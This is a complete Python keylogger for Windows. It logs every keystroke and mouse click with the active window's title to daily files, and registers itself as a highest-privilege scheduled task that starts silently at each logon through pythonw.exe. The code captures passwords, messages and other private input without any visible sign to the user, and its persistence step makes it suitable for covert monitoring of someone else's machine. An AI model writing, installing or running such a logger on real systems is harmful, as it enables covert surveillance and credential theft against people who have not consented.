import os
import sys
import subprocess
import logging
from datetime import datetime
from pynput import keyboard, mouse
import pygetwindow as gw

# === Configuration for Scheduled Task ===
TASK_NAME = "WhatWritingLogger"

def create_scheduled_task(name: str, script_path: str, run_on: str = "onlogon", run_level: str = "highest"):
    """
    Create or update a Windows Scheduled Task that launches this script at user logon.
    """
    python_exe = os.path.join(sys.exec_prefix, "pythonw.exe")
    action = f'"{python_exe}" "{script_path}"'
    cmd = [
        "schtasks",
        "/Create",
        "/TN", name,
        "/TR", action,
        "/SC", run_on,
        "/RL", run_level,
        "/F"  # force overwrite if it already exists
    ]
    subprocess.run(cmd, check=True, shell=True)
    print(f"Scheduled task '{name}' created/updated ({run_on}).")

# === Logger Setup ===

# Determine base directory (where this script is run from)
base_dir = os.getcwd()
logs_dir = os.path.join(base_dir, "logs")
os.makedirs(logs_dir, exist_ok=True)

# Create a log file named after today's date
today_str = datetime.now().strftime("%Y-%m-%d")
log_path = os.path.join(logs_dir, f"{today_str}.txt")

# Configure logging: only time, no milliseconds, no date in each record
logging.basicConfig(
    filename=log_path,
    level=logging.DEBUG,
    format="%(asctime)s : %(message)s",
    datefmt="%H:%M:%S"
)

def log_active_window():
    """Return the title of the active window, or an error placeholder."""
    try:
        active_window = gw.getActiveWindow()
        return active_window.title if active_window else "No active window"
    except Exception as e:
        return f"Error getting active window: {e}"

def on_click(x, y, button, pressed):
    """Log mouse clicks."""
    if pressed:
        active_window = log_active_window()
        logging.info(f"Mouse clicked at ({x}, {y}) in '{active_window}'")

def on_press(key):
    """Log key presses."""
    active_window = log_active_window()
    logging.info(f"Key {key!r} pressed in '{active_window}'")

if __name__ == "__main__":
    # === Optional: register as startup task on Windows ===
    if os.name == 'nt':
        try:
            script = os.path.abspath(__file__)
            create_scheduled_task(TASK_NAME, script, run_on="onlogon", run_level="highest")
        except Exception as e:
            print(f"Failed to create scheduled task: {e}", file=sys.stderr)
    else:
        print("Scheduled task setup is only supported on Windows; skipping.")

    # === Start listening to mouse and keyboard events ===
    with mouse.Listener(on_click=on_click) as mouse_listener, \
         keyboard.Listener(on_press=on_press) as keyboard_listener:
        mouse_listener.join()
        keyboard_listener.join()
